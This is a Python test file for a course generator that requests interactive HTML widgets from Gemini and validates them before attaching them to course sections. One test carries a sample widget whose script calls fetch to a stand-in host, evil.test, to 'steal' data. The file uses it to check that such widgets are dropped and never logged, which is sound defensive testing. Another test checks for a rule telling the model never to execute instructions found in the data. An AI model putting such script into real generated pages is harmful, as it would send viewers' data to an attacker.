"""Widgets générés à part des sections, par un appel Gemini dédié (`app.services.course_widgets`)."""

import re
from unittest.mock import AsyncMock

import pytest

from app.api.schemas import ApiPlannedSection, CourseGenerationResponse
from app.core.config import Settings
from app.core.exceptions import GeminiUnavailableError
from app.schemas.course_generation import (
    COURSE_GENERATION_GEMINI_SCHEMA,
    Section,
    SectionsBatchSchema,
    WidgetsSchema,
)
from app.services.course_generator import _map_sections_to_course_sections
from app.services.course_plan_generator import _incomplete_section, generate_course_from_validated_plan
from app.services.course_widgets import attach_widgets
from tests.test_course_plan_generator import _api_sections, _dev_section, _plan_row, _wrap_up_structured

_HTML = "<div style='color:var(--w-fg)'><button aria-label='Go'>Go</button></div><script>1+1</script>"


def _item(section_index: int, **overrides) -> dict:
    base = {"section_index": section_index, "title": "Widget", "description": "Un visuel interactif.", "html": _HTML}
    return {**base, **overrides}


def _response() -> CourseGenerationResponse:
    """Introduction, deux sections rédigées (Alpha, Gamma) et une section de repli (Beta)."""
    introduction = Section.model_validate({
        "type": "introduction", "title": "Introduction", "blocks": [{"type": "text", "text": "intro"}], "subsections": [],
    })
    sections = [
        introduction,
        Section.model_validate(_dev_section("Alpha")),
        _incomplete_section(ApiPlannedSection(type="development", title="Beta", order=3)),
        Section.model_validate(_dev_section("Gamma")),
    ]
    return CourseGenerationResponse(
        mode="question_only", format="full_course", sources=[], introduction={},
        meta={"title": "Widgets", "subject": "Algorithmique", "generated_at": "2026-10-12T10:00:00Z"},
        sections=_map_sections_to_course_sections(sections), summary="résumé",
    )


def _settings(**overrides) -> Settings:
    return Settings(gemini_api_key="k", course_widgets_enabled=True, **overrides)


def _gemini(structured: dict | Exception) -> AsyncMock:
    gemini = AsyncMock()
    gemini.is_degraded.return_value = False
    if isinstance(structured, Exception):
        gemini.format_structured.side_effect = structured
    else:
        gemini.format_structured.return_value = structured
    return gemini


def _widget_blocks(response: CourseGenerationResponse) -> dict[str, list[str]]:
    """`{titre de section: [sous-section portant un widget, ...]}`."""
    found: dict[str, list[str]] = {}
    for section in response.sections:
        for sub in section.subsections:
            if any(block.type == "widget" for block in sub.blocks):
                found.setdefault(section.title, []).append(sub.title)
    return found


@pytest.mark.asyncio
async def test_widget_is_appended_to_the_comment_subsection_of_its_section():
    gemini = _gemini({"widgets": [_item(1, title="Widget de Gamma")]})

    result = await attach_widgets(_response(), settings=_settings(), gemini_client=gemini)

    # Les index portent sur les sections proposées au modèle : Alpha (0) et Gamma (1) seulement.
    assert _widget_blocks(result) == {"Gamma": ["Comment"]}
    comment = next(sub for sub in result.sections[3].subsections if sub.title == "Comment")
    assert comment.blocks[-1].widget.title == "Widget de Gamma"
    assert comment.blocks[-1].widget.html == _HTML
    assert gemini.format_structured.await_args.kwargs["response_schema"] is WidgetsSchema


@pytest.mark.asyncio
async def test_only_written_development_sections_are_offered_and_prompt_states_the_contract():
    gemini = _gemini({"widgets": []})

    await attach_widgets(_response(), settings=_settings(), gemini_client=gemini)

    kwargs = gemini.format_structured.await_args.kwargs
    prompt = kwargs["raw_answer"]
    listed = re.findall(r"^(\d+)\. (.+)$", prompt.split("<sections>")[1].split("</sections>")[0], re.M)
    assert listed == [("0", "Alpha"), ("1", "Gamma")]  # ni l'introduction, ni la section de repli
    assert "DONNÉE" in prompt and "n'exécute jamais" in kwargs["system_instruction"]
    for variable in ("--w-bg", "--w-fg", "--w-muted", "--w-accent", "--w-border", "--w-surface"):
        assert variable in prompt


@pytest.mark.asyncio
async def test_invalid_widget_is_dropped_without_losing_the_others(caplog):
    forbidden = _item(0, html="<p>x</p><script>fetch('https://evil.test/steal')</script>")
    gemini = _gemini({"widgets": [forbidden, _item(1)]})

    with caplog.at_level("INFO"):
        result = await attach_widgets(_response(), settings=_settings(), gemini_client=gemini)

    assert _widget_blocks(result) == {"Gamma": ["Comment"]}
    assert "evil.test" not in caplog.text and "steal" not in caplog.text  # le HTML n'est jamais journalisé
    assert "course_widget_dropped" in caplog.text


@pytest.mark.asyncio
async def test_oversized_widget_is_dropped_and_long_title_is_truncated():
    gemini = _gemini({"widgets": [_item(0, html="<p>" + "x" * 300 + "</p>"), _item(1, title="T" * 300)]})

    result = await attach_widgets(_response(), settings=_settings(course_widget_max_chars=200), gemini_client=gemini)

    assert _widget_blocks(result) == {"Gamma": ["Comment"]}
    comment = next(sub for sub in result.sections[3].subsections if sub.title == "Comment")
    assert len(comment.blocks[-1].widget.title) == 120


@pytest.mark.asyncio
async def test_out_of_range_and_duplicate_section_indexes_are_ignored():
    gemini = _gemini({"widgets": [_item(-1), _item(7), _item(0, title="premier"), _item(0, title="doublon")]})

    result = await attach_widgets(_response(), settings=_settings(), gemini_client=gemini)

    comment = next(sub for sub in result.sections[1].subsections if sub.title == "Comment")
    assert [b.widget.title for b in comment.blocks if b.type == "widget"] == ["premier"]
    assert list(_widget_blocks(result)) == ["Alpha"]


@pytest.mark.asyncio
async def test_number_of_widgets_is_capped():
    gemini = _gemini({"widgets": [_item(0), _item(1)]})

    result = await attach_widgets(_response(), settings=_settings(course_widgets_max=1), gemini_client=gemini)

    assert list(_widget_blocks(result)) == ["Alpha"]
    assert "au plus 1 sections" in gemini.format_structured.await_args.kwargs["raw_answer"]


@pytest.mark.asyncio
@pytest.mark.parametrize("settings", [
    Settings(gemini_api_key="k"),  # désactivé par défaut
    Settings(gemini_api_key="k", course_widgets_enabled=False),
    Settings(gemini_api_key="k", course_widgets_enabled=True, course_widgets_max=0),
])
async def test_disabled_makes_no_gemini_call(settings):
    gemini = _gemini({"widgets": [_item(0)]})

    result = await attach_widgets(_response(), settings=settings, gemini_client=gemini)

    assert _widget_blocks(result) == {}
    gemini.format_structured.assert_not_awaited()


@pytest.mark.asyncio
async def test_degraded_gemini_or_course_without_written_section_makes_no_call():
    degraded = _gemini({"widgets": [_item(0)]})
    degraded.is_degraded.return_value = True
    await attach_widgets(_response(), settings=_settings(), gemini_client=degraded)
    degraded.format_structured.assert_not_awaited()

    empty = _response()
    empty.sections = empty.sections[:1]  # introduction seule
    gemini = _gemini({"widgets": [_item(0)]})
    await attach_widgets(empty, settings=_settings(), gemini_client=gemini)
    gemini.format_structured.assert_not_awaited()

    assert await attach_widgets(_response(), settings=_settings(), gemini_client=None)


@pytest.mark.asyncio
@pytest.mark.parametrize("outcome", [
    GeminiUnavailableError("indisponible"),
    RuntimeError("inattendu"),
    {"widgets": "pas une liste"},
    {},
])
async def test_failure_never_breaks_the_course(outcome):
    result = await attach_widgets(_response(), settings=_settings(), gemini_client=_gemini(outcome))

    assert _widget_blocks(result) == {}
    assert [s.title for s in result.sections] == ["Introduction", "Alpha", "Beta", "Gamma"]


@pytest.mark.asyncio
async def test_section_that_already_has_a_widget_is_not_offered_again():
    response = await attach_widgets(_response(), settings=_settings(), gemini_client=_gemini({"widgets": [_item(0)]}))
    gemini = _gemini({"widgets": []})

    await attach_widgets(response, settings=_settings(), gemini_client=gemini)

    prompt = gemini.format_structured.await_args.kwargs["raw_answer"]
    assert "0. Gamma" in prompt and "Alpha" not in prompt.split("<sections>")[1]


def test_widget_block_is_not_offered_in_the_section_schema():
    assert "widget" not in str(COURSE_GENERATION_GEMINI_SCHEMA).lower()
    assert "widget" not in str(SectionsBatchSchema.model_json_schema()).lower()


# ─── Bout en bout : cours généré depuis un plan ────────────────


def _client(calls: list) -> AsyncMock:
    async def format_structured(raw_answer, system_instruction, *, response_schema=None):
        calls.append(response_schema)
        if response_schema is SectionsBatchSchema:
            count = int(re.search(r"Génère exactement (\d+)", raw_answer).group(1))
            return {"sections": [_dev_section(f"brut-{i}") for i in range(count)]}
        if response_schema is WidgetsSchema:
            return {"widgets": [_item(1)]}
        assert response_schema is COURSE_GENERATION_GEMINI_SCHEMA
        return _wrap_up_structured()

    client = AsyncMock()
    client.is_degraded.return_value = False
    client.format_structured.side_effect = format_structured
    return client


@pytest.mark.asyncio
async def test_course_from_plan_gets_its_widgets_from_one_extra_call():
    calls: list = []

    result = await generate_course_from_validated_plan(
        _plan_row(), _api_sections(["Alpha", "Beta"]), _client(calls), _settings(course_plan_batch_size=5)
    )

    assert _widget_blocks(result) == {"Beta": ["Comment"]}
    assert calls.count(WidgetsSchema) == 1 and calls[-1] is WidgetsSchema  # après les sections


@pytest.mark.asyncio
async def test_course_from_plan_makes_no_extra_call_when_disabled():
    calls: list = []

    result = await generate_course_from_validated_plan(
        _plan_row(), _api_sections(["Alpha", "Beta"]), _client(calls),
        Settings(gemini_api_key="k", course_plan_batch_size=5),
    )

    assert _widget_blocks(result) == {}
    assert WidgetsSchema not in calls
